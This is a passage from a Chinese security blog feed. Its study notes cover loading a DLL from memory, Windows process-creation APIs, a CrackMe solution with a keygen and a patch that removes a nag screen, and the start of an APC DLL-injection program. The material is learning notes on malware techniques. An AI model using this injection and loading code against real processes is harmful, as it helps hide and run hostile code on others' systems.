class="hljs-comment">//获取所有根据名称导出的函数数量</span><br>DWORD dwNumberOfNames = pExportTable-&gt;NumberOfNames;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; dwNumberOfNames; i++) &#123;<br>lpFuncName = (PCHAR)((DWORD)pDosHeader + lpAddressOfNamesArray[i]);<br><span class="hljs-keyword">if</span> (strcmpi(lpFuncName, lpszFuncName) == <span class="hljs-number">0</span>) &#123;<br><span class="hljs-comment">//获取索引值</span><br>wHint = lpAddressOfNameOrdinalArray[i];<br><span class="hljs-comment">//根据索引值，在AddressOfFunctions中取出RVA</span><br>lpFunc = (LPVOID)((DWORD)pDosHeader + lpAddressOfFuncArray[wHint]);<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br><span class="hljs-comment">//返回函数地址</span><br><span class="hljs-keyword">return</span> lpFunc;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>运行加载桌面上的TestDll.dll文件，此DLL导出函数是一个messagebox函数。</p><p><img src="/2021/07/15/%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF-%E5%86%85%E5%AD%98%E7%9B%B4%E6%8E%A5%E5%8A%A0%E8%BD%BD%E8%BF%90%E8%A1%8C/2.png"></p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p>参考《Windows黑客编程技术详解》一书</p>]]></content>
    
    
    <categories>
      
      <category>黑客编程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>恶意代码</tag>
      
      <tag>黑客编程</tag>
      
      <tag>启动技术</tag>
      
      <tag>PE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>启动技术-创建进程API</title>
    <link href="/2021/07/14/%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF-%E5%88%9B%E5%BB%BA%E8%BF%9B%E7%A8%8BAPI/"/>
    <url>/2021/07/14/%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF-%E5%88%9B%E5%BB%BA%E8%BF%9B%E7%A8%8BAPI/</url>
    
    <content type="html"><![CDATA[<h4 id="创建进程API"><a href="#创建进程API" class="headerlink" title="创建进程API"></a>创建进程API</h4><p>在一个进程中创建并启动一个新的进程，对于病毒木马程序和普通的程序来说，都是常见的技术。在用户层上微软提供WinExec，ShellExecute和CreateProcess等函数来实现进程创建。</p><h4 id="具体实现及函数介绍"><a href="#具体实现及函数介绍" class="headerlink" title="具体实现及函数介绍"></a>具体实现及函数介绍</h4><h5 id="WinExec"><a href="#WinExec" class="headerlink" title="WinExec"></a>WinExec</h5><p>运行指定的应用程序</p><figure class="highlight objectivec"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs objectivec"><span class="hljs-built_in">UINT</span> WinExec(<br>  LPCSTR lpCmdLine,<br>  <span class="hljs-built_in">UINT</span>   uCmdShow<br>);<br></code></pre></div></td></tr></table></figure><p>lpCmdLine：要执行的应用程序的命令行。如果参数中的可执行文件名称不包含文件路径，则系统按以下顺序搜索可执行文件：</p><ol><li>应用程序加载的目录</li><li>当前目录</li><li>Windows系统目录。GetSystemDirectory函数检索此目录的路径。</li><li>Windows目录。GetWindowsDirectory函数检索此目录的路径。</li><li>PATH环节变量中列出的目录</li></ol><p>uCmdShow：显示选项，具体内容如下表：</p><table><thead><tr><th>值</th><th>含义</th></tr></thead><tbody><tr><td>SW_HIDE<BR>0</BR></td><td>隐藏窗口并激活另一个窗口</td></tr><tr><td>SW_SHOWNORMAL<BR>SW_NORMAL<BR>1</BR></BR></td><td>激活并显示一个窗口</td></tr><tr><td>SW_SHOWMINIMIZED<BR>2</BR></td><td>激活窗口并将其显示为最小化的窗口</td></tr><tr><td>SW_SHOWMAXIMIZED<br>SW_MAXIMIZE<br>3</td><td>激活窗口并将其显示为最大化窗口</td></tr><tr><td>SW_SHOWNOACTIVATE<br>4</td><td>以最近的大小和位置显示窗口</td></tr><tr><td>SW_SHOW<br>5</td><td>激活窗口并以其当前大小和位置显示它</td></tr><tr><td>SW_MINIMIZE<br>6</td><td>最小化指定的窗口并激活Z顺序中的下一个顶级窗口</td></tr><tr><td>SW_SHOWMINNOACTIVE<br>7</td><td>将窗口显示为最小化窗口</td></tr><tr><td>SW_SHOWNA<br>8</td><td>以当前大小和位置显示窗口</td></tr><tr><td>SW_RESTORE<br>9</td><td>激活并显示窗口</td></tr><tr><td>SW_SHOWDEFAULT<br>10</td><td>根据启动应用程序的程序传递给CreateProcess函数的STARTUPINFO结构中指定的SW_值设置显示状态。</td></tr><tr><td>SW_FORCEMINIMIZE<br>11</td><td>最小化一个窗口，即使拥有该窗口的线程没有响应。仅在最小化来自不同线程的窗口时才应使用此标志。</td></tr></tbody></table><p>返回值：如果函数成功，则返回值大于31；如果函数失败，则返回值是以下错误值之一。</p><table><thead><tr><th>值</th><th>含义</th></tr></thead><tbody><tr><td>0</td><td>系统内存或资源不足</td></tr><tr><td>ERROR_BAD_FORMAT</td><td>exe文件无效</td></tr><tr><td>ERROR_FILE_NOT_FOUND</td><td>找不到指定文件</td></tr><tr><td>ERROR_PATH_NOT_FOUND</td><td>找不到指定的路径</td></tr></tbody></table><p>具体代码如下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function">BOOL <span class="hljs-title">Open</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* szPath, UINT uiCmdshow)</span></span><br><span class="hljs-function"></span>&#123;<br>UINT uiRet = <span class="hljs-number">0</span>;<br>uiRet = WinExec(szPath, uiCmdshow);<br><span class="hljs-keyword">if</span> (uiRet &gt; <span class="hljs-number">31</span>)<br>&#123;<br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>创建的进程为之前编写过得MFC程序，运行此程序即可提示创建成功，同时TestAPC也被成功创建。</p><p><img src="/2021/07/14/%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF-%E5%88%9B%E5%BB%BA%E8%BF%9B%E7%A8%8BAPI/1.png"></p><h5 id="ShellExecute函数"><a href="#ShellExecute函数" class="headerlink" title="ShellExecute函数"></a>ShellExecute函数</h5><p>对指定文件执行操作</p><figure class="highlight hsp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs hsp"><span class="hljs-keyword">HINSTANCE</span> ShellExecuteA(<br>  <span class="hljs-keyword">HWND</span>   <span class="hljs-keyword">hwnd</span>,<br>  LPCSTR lpOperation,<br>  LPCSTR lpFile,<br>  LPCSTR lpParameters,<br>  LPCSTR lpDirectory,<br>  <span class="hljs-keyword">INT</span>    nShowCmd<br>)<span class="hljs-comment">;</span><br></code></pre></div></td></tr></table></figure><p>hwnd：用于显示UI或者错误信息的父窗口的句柄。如果操作与窗口无关，则此值可以为NULL。</p><p>lpOperation：指向以空字符结尾的字符串的指针，它在本例中成为动词，用于指定要执行的操作。常使用的动词有：</p><ul><li>edit：启动编辑器并打开文档进行编辑。如果lpFile不是文档文件，则该函数将失败。</li><li>explore：探索由lpFile指定的文件夹。</li><li>find：在由lpDirectory指定的目录中启动搜索。</li><li>open：打开由lpFile指定的项目。该项目可以是文件也可以是文件夹。</li><li>print：打印由lpFile指定的文件。如果lpFile不是文档文件，则该函数失败。</li><li>NULL：如果可用，则使用默认动词。如果不可用，则使用“打开”动词。如果两个动词都不可用，则系统使用注册表中列出的第一个动词。</li></ul><p>lpFile：指向以空字符结尾的字符串的指针，该字符串要在其上指向指定谓词的文件或对象。如果lpDirectory参数使用相对路径，则lpFile不要使用相对路径。</p><p>lpParameters：如果lpFile指定一个可执行文件，则此参数是一个指向空字符结尾的字符串的指针，该字符串指定要传递给应用程序的参数。如果lpFile指定一个文档文件，则lpParameters应该为NULL。</p><p>lpDirectory：指向以空终止的字符串的指针，该字符串指定操作的默认目录。如果此值为NULL，则使用当前的工作目录。如果在lpFile提供了相对路径，请不要对lpDirectory使用相对路径。</p><p>nShowCmd：指定应用程序在打开时如何显示标志，具体值在上文。</p><p>返回值：如果函数成功，则返回大于32的值。如果函数失败，则它返回一个错误值，指示失败的原因。</p><p>具体代码如下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">HINSTANCE hInstance = ShellExecute(<span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;自己的文件路径&quot;</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, SW_NORMAL);<br><span class="hljs-keyword">if</span> ((<span class="hljs-keyword">int</span>)hInstance &lt;= <span class="hljs-number">32</span>) &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ShellExecute创建失败\n&quot;</span>);<br>&#125;<br><span class="hljs-keyword">else</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ShellExecute创建成功\n&quot;</span>);<br></code></pre></div></td></tr></table></figure><p>运行程序提示创建成功，同时TestAPC被成功创建。</p><p><img src="/2021/07/14/%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF-%E5%88%9B%E5%BB%BA%E8%BF%9B%E7%A8%8BAPI/2.png"></p><h5 id="CreateProcess"><a href="#CreateProcess" class="headerlink" title="CreateProcess"></a>CreateProcess</h5><p>创建一个新进程及主线程。新进程在调用进程的安全的上下文中运行。</p><figure class="highlight mipsasm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mipsasm"><span class="hljs-keyword">BOOL </span>CreateProcess(<br>  LPCSTR                lpApplicationName,<br>  LPSTR                 lpCommandLine,<br>  LPSECURITY_ATTRIBUTES lpProcessAttributes,<br>  LPSECURITY_ATTRIBUTES lpThreadAttributes,<br>  <span class="hljs-keyword">BOOL </span>                 <span class="hljs-keyword">bInheritHandles,</span><br><span class="hljs-keyword"></span>  DWORD                 dwCreationFlags,<br>  LPVOID                lpEnvironment,<br>  LPCSTR                lpCurrentDirectory,<br>  LPSTARTUPINFOA        lpStartupInfo,<br>  LPPROCESS_INFORMATION lpProcessInformation<br>);<br></code></pre></div></td></tr></table></figure><p>lpApplicationName：要执行的模块的名称。可以设置为NULL。要运行批处理文件，必须启动命令解释程序，并将其设置为cmd.exe。</p><p>lpCommandLine：要执行的命令行。</p><p>lpProcessAttributes：指向SECURITY_ATTRIBUTES结构的指针，该 结构确定返回的新进程对象的句柄是否可以被子进程继承。如果<em>lpProcessAttributes</em>为NULL，则不能继承句柄。</p><p>lpThreadAttributes：指向SECURITY_ATTRIBUTES结构的指针，该 结构确定返回的新线程对象句柄是否可由子进程继承。如果<em>lpThreadAttributes</em>为 NULL，则不能继承句柄。</p><p>bInheritHandles：如果此参数为 TRUE，则调用进程中的每个可继承句柄都由新进程继承。如果参数为 FALSE，则不继承句柄。</p><p>dwCreationFlags：控制优先级类和进程创建的标志。</p><p>lpEnvironment：指向新进程的环境块的指针。如果此参数为NULL，则新进程使用调用进程的环境。</p><p>lpCurrentDirectory：进程当前目录的完整路径。该字符串还可以指定 UNC 路径。如果此参数为NULL，则新进程将与调用进程具有相同的当前驱动器和目录。</p><p>lpStartupInfo：指向STARTUPINFO或STARTUPINFOEX结构的指针 。STARTUPINFO或STARTUPINFOEX中的句柄在不需要时必须由CloseHandle关闭。</p><p>lpProcessInformation：指向PROCESS_INFORMATION结构的指针，该结构接收有关新进程的标识信息。PROCESS_INFORMATION中的句柄必须在不需要时由CloseHandle关闭。</p><p>返回值：如果函数成功，则返回值非0；若失败，则返回值为0。</p><p>具体代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">STARTUPINFO si = &#123; <span class="hljs-number">0</span> &#125;;<br>PROCESS_INFORMATION pi;<br>si.cb = <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(si);<br>si.dwFlags = STARTF_USESHOWWINDOW;<br>si.wShowWindow = SW_NORMAL;<br>BOOL flag = <span class="hljs-built_in">CreateProcess</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;自己的文件路径&quot;</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, FALSE, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, &amp;si, &amp;pi);<br><span class="hljs-keyword">if</span> (flag) &#123;<br>    <span class="hljs-built_in">CloseHandle</span>(pi.hThread);<br>    <span class="hljs-built_in">CloseHandle</span>(pi.hProcess);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;CreateProcess创建成功\n&quot;</span>);<br>&#125;<br><span class="hljs-keyword">else</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;CreateProcess创建失败\n&quot;</span>);<br></code></pre></div></td></tr></table></figure><p>运行之后，即可成功创建TestAPC进程。</p><p><img src="/2021/07/14/%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF-%E5%88%9B%E5%BB%BA%E8%BF%9B%E7%A8%8BAPI/3.png"></p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p>参考《Windows黑客编程技术详解》一书</p>]]></content>
    
    
    <categories>
      
      <category>黑客编程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>恶意代码</tag>
      
      <tag>黑客编程</tag>
      
      <tag>启动技术</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>160CrackMe-001</title>
    <link href="/2021/07/14/160CrackMe-001/"/>
    <url>/2021/07/14/160CrackMe-001/</url>
    
    <content type="html"><![CDATA[<h4 id="初探"><a href="#初探" class="headerlink" title="初探"></a>初探</h4><p>打开程序会弹出如下的窗口，根据标题可以看出，我们需要“杀死”这个弹窗。</p><p><img src="/2021/07/14/160CrackMe-001/1.png"></p><p>程序主题界面有两部分，第一部分是序列号加名字。</p><p><img src="/2021/07/14/160CrackMe-001/2.png"></p><p>第二部分是单纯的序列号，应该是比较简单。</p><p><img src="/2021/07/14/160CrackMe-001/3.png"></p><p>看完大体流程，开始分析。</p><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>查询程序的基本信息，可以看到未加壳，是用Delphi语言编写的。</p><p><img src="/2021/07/14/160CrackMe-001/4.png"></p><h5 id="先分析单纯的序列号。"><a href="#先分析单纯的序列号。" class="headerlink" title="先分析单纯的序列号。"></a>先分析单纯的序列号。</h5><p>用OD打开程序，搜索字符串，搜索错误的提示，可以看到成功与错误的提示，还有一个JNZ，这里应该是关键的判断跳转。</p><p><img src="/2021/07/14/160CrackMe-001/5.png"></p><p>在函数头部下断点，开始分析。可以看到它把Hello和Dude！压入栈之后，再将其拼接起来组成新的字符串，然后再与我们输入的序列号进行比较。</p><p><img src="/2021/07/14/160CrackMe-001/6.png"></p><p><img src="/2021/07/14/160CrackMe-001/7.png"></p><p>那么这里的序列号就是Hello Dude!。输入正确的序列号之后，弹出正确的窗口。</p><p><img src="/2021/07/14/160CrackMe-001/8.png"></p><h5 id="再来分析序列号加用户名"><a href="#再来分析序列号加用户名" class="headerlink" title="再来分析序列号加用户名"></a>再来分析序列号加用户名</h5><p>还是通过搜索错误提示的字符串，即可找到关键的跳转，在最后的跳转前查看一下，可以看到栈存放着两个值进行比较，一个是我们输入的123456，另一个是CW-80360-CRACKED，那么这个应该是要输入的serial。往上开始寻找这段序列号是如何生成的。在函数头部下断开始分析。</p><p><img src="/2021/07/14/160CrackMe-001/10.png"></p><p>首先是检测了输入的用户名长度，不可以小于4位。</p><p><img src="/2021/07/14/160CrackMe-001/9.png"></p><p>继续往下看，可以看到CW，-，CRACKED和数字这几段，然后通过一个函数将它们拼接起来，字母都是本身有的，那么就需要寻找数字的生成。</p><p><img src="/2021/07/14/160CrackMe-001/11.png"></p><p>数字是通过sub_406718生成的，而其中的参数是通过0x431750处传入的，那么这个值是从哪来的，从上分析。可以看到这里的计算过程。它是获取输入用户名第一位然后乘以0x29再乘以2。而之后的sub_406718作用是将十六进制转为十进制字符串。</p><p><img src="/2021/07/14/160CrackMe-001/12.png"></p><p>到这里整个过程就分析了，开始尝试编写注册机</p><h4 id="注册机编写"><a href="#注册机编写" class="headerlink" title="注册机编写"></a>注册机编写</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;pch.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt; stdio.h &gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;corecrt_malloc.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">char</span> Name[<span class="hljs-number">20</span>];<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;请输入大于四位的用户名\n&quot;</span>);<br>    gets_s(Name, <span class="hljs-number">20</span>);<br>    <span class="hljs-keyword">int</span> Num;<br>    Num = (Name[<span class="hljs-number">0</span>] * <span class="hljs-number">0x29</span>) * <span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">char</span>* s1=<span class="hljs-string">&quot;CW&quot;</span>;<br>    <span class="hljs-keyword">char</span>* s2 = <span class="hljs-string">&quot;CRACKED&quot;</span>;<br>    <span class="hljs-keyword">char</span>* s3= <span class="hljs-string">&quot;-&quot;</span>;<br>    <span class="hljs-keyword">char</span>* serial = (<span class="hljs-keyword">char</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">100</span>);<br>    <span class="hljs-built_in">sprintf</span>(serial, <span class="hljs-string">&quot;%s%s%d%s%s&quot;</span>, s1, s3, Num, s3, s2);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;用户名是：%s\nserial是：%s&quot;</span>, Name, serial);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>输入用户名b1ackie，就可以计算出正确的serial。</p><p><img src="/2021/07/14/160CrackMe-001/13.png"></p><p>输入正确的值查看</p><p><img src="/2021/07/14/160CrackMe-001/14.png"></p><h4 id="弹窗的消除"><a href="#弹窗的消除" class="headerlink" title="弹窗的消除"></a>弹窗的消除</h4><p>先根据弹窗的提示信息，搜索字符串，可以定位到此处。</p><p><img src="/2021/07/14/160CrackMe-001/15.png"></p><p>执行出来，可以看到在外部有一个JZ跳转可以跳过这个弹窗函数，我们只需要将其修改为JMP就可以无条件跳走了。</p><p><img src="/2021/07/14/160CrackMe-001/16.png"></p><h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><p>第一个crackme，还是比较简单的，没有什么难度，做起来比较轻松。</p><p>还记得上次做这个还是大一的时候，那个时候也刚接触这块没多久，当时还是看着帖子一步一步学着来。学习记录还是要坚持做下去，这些crackme也要坚持争取全部都做一遍。</p>]]></content>
    
    
    <categories>
      
      <category>CrackMe</category>
      
    </categories>
    
    
    <tags>
      
      <tag>逆向工程</tag>
      
      <tag>CrackMe</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>注入技术-APC注入</title>
    <link href="/2021/07/13/%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF-APC%E6%B3%A8%E5%85%A5/"/>
    <url>/2021/07/13/%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF-APC%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h4 id="APC注入"><a href="#APC注入" class="headerlink" title="APC注入"></a>APC注入</h4><p>APC为异步过程调用，是指函数在特定线程中被异步执行。每一个线程都有自己的APC队列，使用QueueUserAPC函数可以把一个APC函数压入APC队列中，插入LoadLibrary就可以执行DLL。该线程并不会直接调用APC函数，除非该线程处于一个可通知的状态。</p><h4 id="函数介绍"><a href="#函数介绍" class="headerlink" title="函数介绍"></a>函数介绍</h4><h5 id="QueueUserAPC"><a href="#QueueUserAPC" class="headerlink" title="QueueUserAPC"></a>QueueUserAPC</h5><p>将用户模式中的异步过程调用（APC）对象添加到指定线程的APC队列中。</p><figure class="highlight arduino"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs arduino"><span class="hljs-function">DWORD <span class="hljs-title">QueueUserAPC</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  PAPCFUNC  pfnAPC,</span></span><br><span class="hljs-params"><span class="hljs-function">  HANDLE    hThread,</span></span><br><span class="hljs-params"><span class="hljs-function">  ULONG_PTR dwData</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></div></td></tr></table></figure><p>pfnAPC：当指定线程执行可警告的等待操作时，指向应用程序提供的APC函数的指针。</p><p>hThread：线程的句柄。该句柄必须具有THREAD_SET_CONTEXT访问权限。</p><p>dwData：传递由pfnAPC参数指向的APC函数的单个值。</p><p>返回值：如果函数成功，则返回值为非0；如果失败，则返回值为0。</p><h4 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h4><p>在Windows系统中，每个线程都会维护一个线程APC队列，通过QueueUserAPC把一个APC函数添加到指定线程的APC队列中。每个线程都有自己的APC队列，这个APC队列记录了要求线程执行的一些APC函数。Windows系统会发出一个软中断去执行这些APC函数，对于用户模式下的APC队列，当线程处在可警告状态时才会执行这些APC函数。一个线程在内部使用SingalObjectAndWait、SleepEx、WaitForSingleObjectEx等函数把自己挂起时就是进入警告状态，此时便会执行APC队列函数。</p><h5 id="具体代码如下："><a href="#具体代码如下：" class="headerlink" title="具体代码如下："></a>具体代码如下：</h5><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">// APCInject.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。</span><br><span class="hljs-comment">//</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;pch.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;tlhelp32.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;atlconv.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;atlstr.h&gt;</span></span><br><span class="hljs-function">DWORD <span class="hljs-title">GetPidByName</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* pszProcessName)</span> </span>&#123;<br>    HANDLE hSnap = <span class="hljs-built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS, <span class="hljs-number">0</span>);<br>    PROCESSENTRY32 PE32 = &#123; <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(PE32) &#125;;<br>    USES_CONVERSION;<br>    CString ProcessName = <span class="hljs-built_in">A2T</span>(pszProcessName);<br>    BOOL flag = <span class="hljs-built_in">Process32First</span>(hSnap, &amp;PE32);<br>    <span class="hljs-keyword">while</span> (flag) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">lstrcmp</span>(PE32.szExeFile, ProcessName) == <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">return</span> PE32.th32ProcessID;<br>        &#125;<br>        flag = <span 